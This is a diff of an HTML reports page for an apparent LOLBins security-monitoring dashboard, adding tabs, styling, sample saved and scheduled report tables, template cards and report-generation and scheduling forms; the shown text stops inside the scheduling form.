@@ -9,8 +9,88 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <!-- Use the same style as your dashboard -->
     <link rel="stylesheet" href="../static/css/dashboard.css">
+    <style>
+        /* Additional styles for reports page */
+        .nav-tabs .nav-link {
+            color: rgba(255, 255, 255, 0.7);
+            background-color: rgba(0, 0, 0, 0.2);
+            border: none;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .nav-tabs .nav-link.active {
+            color: #3498db;
+            background-color: rgba(0, 0, 0, 0.1);
+            border-bottom: 3px solid #3498db;
+        }
+        
+        .report-card {
+            transition: transform 0.2s;
+        }
+        
+        .report-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .report-preview {
+            background-color: #fff;
+            color: #333;
+            border-radius: 5px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .report-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .chart-container {
+            height: 250px;
+            position: relative;
+        }
+        
+        .scheduled-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        
+        .report-filter-btn {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.875rem;
+            color: rgba(255, 255, 255, 0.7);
+            background-color: rgba(0, 0, 0, 0.2);
+            border: none;
+            border-radius: 20px;
+            margin-right: 5px;
+            transition: all 0.2s;
+        }
+        
+        .report-filter-btn.active {
+            color: white;
+            background-color: #3498db;
+        }
+        
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
     <!-- Sidebar - Same as dashboard -->
@@ -59,174 +139,517 @@
         <div class="header">
             <h1>Security Reports</h1>
             <div class="header-actions">
+                <button class="btn btn-outline-light me-2" id="scheduleReportBtn">
+                    <i class="fas fa-calendar-alt me-1"></i> Schedule Report
+                </button>
                 <button class="btn btn-primary" id="generateReportBtn">
                     <i class="fas fa-file-export me-1"></i> Generate New Report
                 </button>
             </div>
         </div>
 
-        <!-- Report filters -->
-        <div class="card mb-4">
-            <div class="card-body">
-                <div class="row g-3">
-                    <div class="col-md-3">
-                        <label for="reportType" class="form-label">Report Type</label>
-                        <select id="reportType" class="form-select">
-                            <option value="summary">Executive Summary</option>
-                            <option value="detailed">Detailed Technical Report</option>
-                            <option value="compliance">Compliance Report</option>
-                            <option value="trend">Trend Analysis</option>
-                        </select>
+        <!-- Report navigation tabs -->
+        <ul class="nav nav-tabs mb-3" id="reportTabs">
+            <li class="nav-item">
+                <a class="nav-link active" id="saved-tab" data-bs-toggle="tab" href="#saved-reports">Saved Reports</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" id="scheduled-tab" data-bs-toggle="tab" href="#scheduled-reports">Scheduled Reports</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" id="templates-tab" data-bs-toggle="tab" href="#report-templates">Templates</a>
+            </li>
+        </ul>
+
+        <div class="tab-content">
+            <!-- Saved Reports Tab -->
+            <div class="tab-pane fade show active" id="saved-reports">
+                <!-- Report filters -->
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <div class="row g-3">
+                            <div class="col-md-3">
+                                <label for="reportType" class="form-label">Report Type</label>
+                                <select id="reportType" class="form-select">
+                                    <option value="all">All Types</option>
+                                    <option value="summary">Executive Summary</option>
+                                    <option value="detailed">Detailed Technical Report</option>
+                                    <option value="compliance">Compliance Report</option>
+                                    <option value="trend">Trend Analysis</option>
+                                </select>
+                            </div>
+                            <div class="col-md-3">
+                                <label for="timeRange" class="form-label">Time Range</label>
+                                <select id="timeRange" class="form-select">
+                                    <option value="all">All Time</option>
+                                    <option value="day">Last 24 Hours</option>
+                                    <option value="week" selected>Last 7 Days</option>
+                                    <option value="month">Last 30 Days</option>
+                                    <option value="custom">Custom Range</option>
+                                </select>
+                            </div>
+                            <div class="col-md-3">
+                                <label for="formatType" class="form-label">Format</label>
+                                <select id="formatType" class="form-select">
+                                    <option value="all">All Formats</option>
+                                    <option value="pdf">PDF</option>
+                                    <option value="html">HTML</option>
+                                    <option value="csv">CSV</option>
+                                    <option value="json">JSON</option>
+                                </select>
+                            </div>
+                            <div class="col-md-3 d-flex align-items-end">
+                                <button class="btn btn-outline-primary w-100" id="applyFiltersBtn">
+                                    Apply Filters
+                                </button>
+                            </div>
+                        </div>
                     </div>
-                    <div class="col-md-3">
-                        <label for="timeRange" class="form-label">Time Range</label>
-                        <select id="timeRange" class="form-select">
-                            <option value="day">Last 24 Hours</option>
-                            <option value="week" selected>Last 7 Days</option>
-                            <option value="month">Last 30 Days</option>
-                            <option value="custom">Custom Range</option>
-                        </select>
+                </div>
+
+                <!-- Saved Reports -->
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <span>Saved Reports</span>
+                        <div>
+                            <button class="report-filter-btn active" data-filter="all">All</button>
+                            <button class="report-filter-btn" data-filter="recent">Recent</button>
+                            <button class="report-filter-btn" data-filter="favorites">Favorites</button>
+                        </div>
                     </div>
-                    <div class="col-md-3">
-                        <label for="formatType" class="form-label">Format</label>
-                        <select id="formatType" class="form-select">
-                            <option value="pdf">PDF</option>
-                            <option value="html">HTML</option>
-                            <option value="csv">CSV</option>
-                            <option value="json">JSON</option>
-                        </select>
+                    <div class="card-body p-0">
+                        <div class="table-responsive">
+                            <table class="table table-dark table-hover mb-0">
+                                <thead>
+                                    <tr>
+                                        <th>Report Name</th>
+                                        <th>Date Generated</th>
+                                        <th>Type</th>
+                                        <th>Time Period</th>
+                                        <th>Format</th>
+                                        <th>Status</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="reportsList">
+                                    <tr>
+                                        <td>Monthly_Security_Report_March_2025</td>
+                                        <td>2025-03-01 09:15:22</td>
+                                        <td>Executive Summary</td>
+                                        <td>March 2025</td>
+                                        <td><span class="badge bg-danger">PDF</span></td>
+                                        <td><span class="badge bg-success">Completed</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report" data-report-name="Monthly_Security_Report_March_2025">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-warning me-1 favorite-btn" title="Add to Favorites">
+                                                <i class="far fa-star"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Report">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Weekly_LOLBins_Analysis_Feb25</td>
+                                        <td>2025-02-25 14:30:10</td>
+                                        <td>Detailed Technical Report</td>
+                                        <td>Feb 19-25, 2025</td>
+                                        <td><span class="badge bg-info">HTML</span></td>
+                                        <td><span class="badge bg-success">Completed</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report" data-report-name="Weekly_LOLBins_Analysis_Feb25">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-warning me-1 favorite-btn" title="Add to Favorites">
+                                                <i class="far fa-star"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Report">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Attack_Detection_Summary_Feb20</td>
+                                        <td>2025-02-20 11:42:15</td>
+                                        <td>Trend Analysis</td>
+                                        <td>Jan-Feb 2025</td>
+                                        <td><span class="badge bg-warning">CSV</span></td>
+                                        <td><span class="badge bg-success">Completed</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report" data-report-name="Attack_Detection_Summary_Feb20">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-warning me-1 favorite-btn" title="Add to Favorites">
+                                                <i class="far fa-star"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Report">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Compliance_Report_Q1_2025</td>
+                                        <td>2025-03-10 16:22:45</td>
+                                        <td>Compliance Report</td>
+                                        <td>Q1 2025</td>
+                                        <td><span class="badge bg-danger">PDF</span></td>
+                                        <td><span class="badge bg-purple">Scheduled</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" disabled title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" disabled title="Preview Report">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-warning me-1 favorite-btn" title="Add to Favorites">
+                                                <i class="far fa-star"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Report">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
-                    <div class="col-md-3 d-flex align-items-end">
-                        <button class="btn btn-outline-primary w-100" id="applyFiltersBtn">
-                            Apply Filters
+                </div>
+            </div>
+
+            <!-- Scheduled Reports Tab -->
+            <div class="tab-pane fade" id="scheduled-reports">
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <span>Scheduled Reports</span>
+                        <button id="newScheduleBtn" class="btn btn-sm btn-outline-primary">
+                            <i class="fas fa-plus me-1"></i> New Schedule
                         </button>
                     </div>
+                    <div class="card-body p-0">
+                        <div class="table-responsive">
+                            <table class="table table-dark table-hover mb-0">
+                                <thead>
+                                    <tr>
+                                        <th>Report Name</th>
+                                        <th>Frequency</th>
+                                        <th>Next Run</th>
+                                        <th>Type</th>
+                                        <th>Recipients</th>
+                                        <th>Status</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="scheduledReportsList">
+                                    <tr>
+                                        <td>Weekly Security Summary</td>
+                                        <td>Every Monday at 08:00</td>
+                                        <td>2025-03-16 08:00:00</td>
+                                        <td>Executive Summary</td>
+                                        <td title="security@company.com, admin@company.com">security@company.com +1</td>
+                                        <td><span class="badge bg-success">Active</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Edit Schedule">
+                                                <i class="fas fa-edit"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" title="Pause Schedule">
+                                                <i class="fas fa-pause"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Schedule">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Monthly Technical Report</td>
+                                        <td>1st day of month at 06:00</td>
+                                        <td>2025-04-01 06:00:00</td>
+                                        <td>Detailed Technical Report</td>
+                                        <td>security@company.com</td>
+                                        <td><span class="badge bg-success">Active</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Edit Schedule">
+                                                <i class="fas fa-edit"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" title="Pause Schedule">
+                                                <i class="fas fa-pause"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Schedule">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Quarterly Compliance Report</td>
+                                        <td>Every 3 months</td>
+                                        <td>2025-06-01 09:00:00</td>
+                                        <td>Compliance Report</td>
+                                        <td>compliance@company.com</td>
+                                        <td><span class="badge bg-secondary">Paused</span></td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Edit Schedule">
+                                                <i class="fas fa-edit"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-success me-1" title="Resume Schedule">
+                                                <i class="fas fa-play"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-danger" title="Delete Schedule">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Recent Report History -->
+                <div class="card mt-4">
+                    <div class="card-header">
+                        Recent Scheduled Report History
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="table-responsive">
+                            <table class="table table-dark table-hover mb-0">
+                                <thead>
+                                    <tr>
+                                        <th>Report Name</th>
+                                        <th>Generated On</th>
+                                        <th>Schedule</th>
+                                        <th>Status</th>
+                                        <th>Recipients</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Weekly Security Summary</td>
+                                        <td>2025-03-09 08:00:02</td>
+                                        <td>Weekly (Monday)</td>
+                                        <td><span class="badge bg-success">Sent</span></td>
+                                        <td>2 recipients</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" title="Resend Email">
+                                                <i class="fas fa-envelope"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Weekly Security Summary</td>
+                                        <td>2025-03-02 08:00:01</td>
+                                        <td>Weekly (Monday)</td>
+                                        <td><span class="badge bg-success">Sent</span></td>
+                                        <td>2 recipients</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-secondary me-1" title="Resend Email">
+                                                <i class="fas fa-envelope"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td>Monthly Technical Report</td>
+                                        <td>2025-03-01 06:00:05</td>
+                                        <td>Monthly (1st)</td>
+                                        <td><span class="badge bg-danger">Failed</span></td>
+                                        <td>1 recipient</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
+                                                <i class="fas fa-download"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info me-1" title="Error Details">
+                                                <i class="fas fa-exclamation-circle"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-success me-1" title="Retry">
+                                                <i class="fas fa-redo"></i>
+                                            </button>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Saved Reports -->
-        <div class="card">
-            <div class="card-header">
-                Saved Reports
-            </div>
-            <div class="card-body p-0">
-                <div class="table-responsive">
-                    <table class="table table-dark table-hover mb-0">
-                        <thead>
-                            <tr>
-                                <th>Report Name</th>
-                                <th>Date Generated</th>
-                                <th>Type</th>
-                                <th>Time Period</th>
-                                <th>Format</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody id="reportsList">
-                            <tr>
-                                <td>Monthly_Security_Report_March_2025</td>
-                                <td>2025-03-01 09:15:22</td>
-                                <td>Executive Summary</td>
-                                <td>March 2025</td>
-                                <td><span class="badge bg-danger">PDF</span></td>
-                                <td>
-                                    <button class="btn btn-sm btn-outline-primary me-1">
-                                        <i class="fas fa-download"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline-danger">
-                                        <i class="fas fa-trash"></i>
-                                    </button>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td>Weekly_LOLBins_Analysis_Feb25</td>
-                                <td>2025-02-25 14:30:10</td>
-                                <td>Detailed Technical Report</td>
-                                <td>Feb 19-25, 2025</td>
-                                <td><span class="badge bg-info">HTML</span></td>
-                                <td>
-                                    <button class="btn btn-sm btn-outline-primary me-1">
-                                        <i class="fas fa-download"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline-danger">
-                                        <i class="fas fa-trash"></i>
-                                    </button>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td>Attack_Detection_Summary_Feb20</td>
-                                <td>2025-02-20 11:42:15</td>
-                                <td>Trend Analysis</td>
-                                <td>Jan-Feb 2025</td>
-                                <td><span class="badge bg-warning">CSV</span></td>
-                                <td>
-                                    <button class="btn btn-sm btn-outline-primary me-1">
-                                        <i class="fas fa-download"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline-danger">
-                                        <i class="fas fa-trash"></i>
-                                    </button>
-                                </td>
-                            </tr>
-                        </tbody>
-                    </table>
+            <!-- Templates Tab -->
+            <div class="tab-pane fade" id="report-templates">
+                <div class="card">
+                    <div class="card-header">
+                        Report Templates
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-file-alt fa-3x mb-3 text-primary"></i>
+                                        <h5>Executive Summary</h5>
+                                        <p class="small text-muted">High-level overview of security events</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Executive Summary">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Executive Summary">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-file-code fa-3x mb-3 text-info"></i>
+                                        <h5>Technical Detail</h5>
+                                        <p class="small text-muted">Comprehensive technical analysis</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Technical Detail">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Technical Detail">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-chart-line fa-3x mb-3 text-success"></i>
+                                        <h5>Trend Analysis</h5>
+                                        <p class="small text-muted">Statistical trends and patterns</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Trend Analysis">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Trend Analysis">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-clipboard-check fa-3x mb-3 text-warning"></i>
+                                        <h5>Compliance</h5>
+                                        <p class="small text-muted">Regulatory compliance overview</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Compliance">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Compliance">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="row mt-4">
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-user-shield fa-3x mb-3 text-danger"></i>
+                                        <h5>Incident Response</h5>
+                                        <p class="small text-muted">Detailed security incident analysis</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Incident Response">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Incident Response">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-project-diagram fa-3x mb-3 text-purple"></i>
+                                        <h5>MITRE ATT&CK</h5>
+                                        <p class="small text-muted">Tactics and techniques mapping</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="MITRE ATT&CK">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="MITRE ATT&CK">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-user-tie fa-3x mb-3 text-info"></i>
+                                        <h5>Executive Brief</h5>
+                                        <p class="small text-muted">Concise summary for management</p>
+                                        <div class="mt-2">
+                                            <button class="btn btn-sm btn-outline-primary template-btn" data-template="Executive Brief">
+                                                Use Template
+                                            </button>
+                                            <button class="btn btn-sm btn-outline-info ms-1 preview-template-btn" data-template="Executive Brief">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 mb-3">
+                                <div class="card bg-dark report-card border border-dashed border-secondary">
+                                    <div class="card-body text-center p-4">
+                                        <i class="fas fa-plus-circle fa-3x mb-3 text-secondary"></i>
+                                        <h5>Custom Template</h5>
+                                        <p class="small text-muted">Create your own template</p>
+                                        <button class="btn btn-sm btn-outline-secondary mt-2" id="createTemplateBtn">
+                                            Create New
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-            </div>
-        </div>
-
-        <!-- Report Templates -->
-        <div class="card mt-4">
-            <div class="card-header">
-                Report Templates
-            </div>
-            <div class="card-body">
-                <div class="row">
-                    <div class="col-md-3 mb-3">
-                        <div class="card bg-dark">
-                            <div class="card-body text-center p-4">
-                                <i class="fas fa-file-alt fa-3x mb-3 text-primary"></i>
-                                <h5>Executive Summary</h5>
-                                <p class="small text-muted">High-level overview of security events</p>
-                                <button class="btn btn-sm btn-outline-primary mt-2">
-                                    Use Template
-                                </button>
-                            </div>
-                        </div>
+                
+                <!-- Template Preview -->
+                <div class="card mt-4" id="templatePreviewCard" style="display: none;">
+                    <div class="card-header d-flex justify-content-between align-items-center">
+                        <span>Template Preview: <span id="previewTemplateName">Executive Summary</span></span>
+                        <button type="button" class="btn-close btn-close-white" id="closeTemplatePreviewBtn"></button>
                     </div>
-                    <div class="col-md-3 mb-3">
-                        <div class="card bg-dark">
-                            <div class="card-body text-center p-4">
-                                <i class="fas fa-file-code fa-3x mb-3 text-info"></i>
-                                <h5>Technical Detail</h5>
-                                <p class="small text-muted">Comprehensive technical analysis</p>
-                                <button class="btn btn-sm btn-outline-primary mt-2">
-                                    Use Template
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-3 mb-3">
-                        <div class="card bg-dark">
-                            <div class="card-body text-center p-4">
-                                <i class="fas fa-chart-line fa-3x mb-3 text-success"></i>
-                                <h5>Trend Analysis</h5>
-                                <p class="small text-muted">Statistical trends and patterns</p>
-                                <button class="btn btn-sm btn-outline-primary mt-2">
-                                    Use Template
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-3 mb-3">
-                        <div class="card bg-dark">
-                            <div class="card-body text-center p-4">
-                                <i class="fas fa-clipboard-check fa-3x mb-3 text-warning"></i>
-                                <h5>Compliance</h5>
-                                <p class="small text-muted">Regulatory compliance overview</p>
-                                <button class="btn btn-sm btn-outline-primary mt-2">
-                                    Use Template
-                                </button>
+                    <div class="card-body">
+                        <div class="report-preview">
+                            <div id="templatePreviewContent">
+                                <!-- Template preview content will be inserted here -->
                             </div>
                         </div>
                     </div>
@@ -244,7 +667,7 @@
                     <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body">
-                    <form>
+                    <form id="reportForm">
                         <div class="mb-3">
                             <label for="reportName" class="form-label">Report Name</label>
                             <input type="text" class="form-control" id="reportName" placeholder="Enter report name">
@@ -257,6 +680,9 @@
                                     <option value="detailed">Detailed Technical Report</option>
                                     <option value="compliance">Compliance Report</option>
                                     <option value="trend">Trend Analysis</option>
+                                    <option value="incident">Incident Response</option>
+                                    <option value="mitre">MITRE ATT&CK</option>
+                                    <option value="brief">Executive Brief</option>
                                 </select>
                             </div>
                             <div class="col-md-6">
@@ -281,36 +707,216 @@
                         </div>
                         <div class="mb-3">
                             <label class="form-label">Include Sections</label>
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="includeSummary" checked>
-                                <label class="form-check-label" for="includeSummary">
-                                    Executive Summary
-                                </label>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeSummary" checked>
+                                        <label class="form-check-label" for="includeSummary">
+                                            Executive Summary
+                                        </label>
+                                    </div>
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeAlerts" checked>
+                                        <label class="form-check-label" for="includeAlerts">
+                                            Alert Details
+                                        </label>
+                                    </div>
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeCharts" checked>
+                                        <label class="form-check-label" for="includeCharts">
+                                            Charts and Visualizations
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeRecommendations">
+                                        <label class="form-check-label" for="includeRecommendations">
+                                            Recommendations
+                                        </label>
+                                    </div>
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeMitreTactics">
+                                        <label class="form-check-label" for="includeMitreTactics">
+                                            MITRE ATT&CK Mapping
+                                        </label>
+                                    </div>
+                                    <div class="form-check mb-2">
+                                        <input class="form-check-input" type="checkbox" id="includeLolbinsBreakdown">
+                                        <label class="form-check-label" for="includeLolbinsBreakdown">
+                                            LOLBins Breakdown
+                                        </label>
+                                    </div>
+                                </div>
                             </div>
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="includeAlerts" checked>
-                                <label class="form-check-label" for="includeAlerts">
-                                    Alert Details
-                                </label>
-                            </div>
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="includeCharts" checked>
-                                <label class="form-check-label" for="includeCharts">
-                                    Charts and Visualizations
-                                </label>
-                            </div>
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="includeRecommendations">
-                                <label class="form-check-label" for="includeRecommendations">
-                                    Recommendations
-                                </label>
+                        </div>
+                        
+                        <!-- Preview toggle -->
+                        <div class="form-check form-switch mb-3">
+                            <input class="form-check-input" type="checkbox" id="showPreviewSwitch">
+                            <label class="form-check-label" for="showPreviewSwitch">Show Report Preview</label>
+                        </div>
+                        
+                        <!-- Report Preview -->
+                        <div id="reportPreviewSection" style="display: none;">
+                            <div class="card bg-secondary mb-3">
+                                <div class="card-header">Report Preview</div>
+                                <div class="card-body">
+                                    <div class="report-preview">
+                                        <h2 class="report-title" id="previewTitle">Security Report</h2>
+                                        <p class="text-muted">Preview based on selected options</p>
+                                        
+                                        <div class="row">
+                                            <div class="col-md-6">
+                                                <div class="chart-container">
+                                                    <canvas id="lolbinsDistributionChart"></canvas>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-6">
+                                                <div class="chart-container">
+                                                    <canvas id="alertSeverityChart"></canvas>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
                             </div>
                         </div>
                     </form>
                 </div>
                 <div class="modal-footer">
                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                    <button type="button" class="btn btn-primary" id="createReportBtn">Generate Report</button>
+                    <button type="button" class="btn btn-primary" id="createReportBtn">
+                        <span id="generateBtnText">Generate Report</span>
+                        <span id="generateSpinner" class="spinner-border spinner-border-sm ms-1" role="status" style="display: none;"></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Schedule Report Modal -->
+    <div class="modal fade" id="scheduleReportModal" tabindex="-1" aria-labelledby="scheduleReportModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="scheduleReportModalLabel">Schedule Report</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="scheduleForm">
+                        <div class="mb-3">
+                            <label for="scheduleReportName" class="form-label">Report Name</label>
+                            <input type="text" class="form-control" id="scheduleReportName" placeholder="Enter report name">
+                        </div>
+                        
+                        <div class="row mb-3">
+                            <div class="col-md-6">
+                                <label for="scheduleReportType" class="form-label">Report Type</label>
+                                <select id="scheduleReportType" class="form-select">
+                                    <option value="summary">Executive Summary</option>
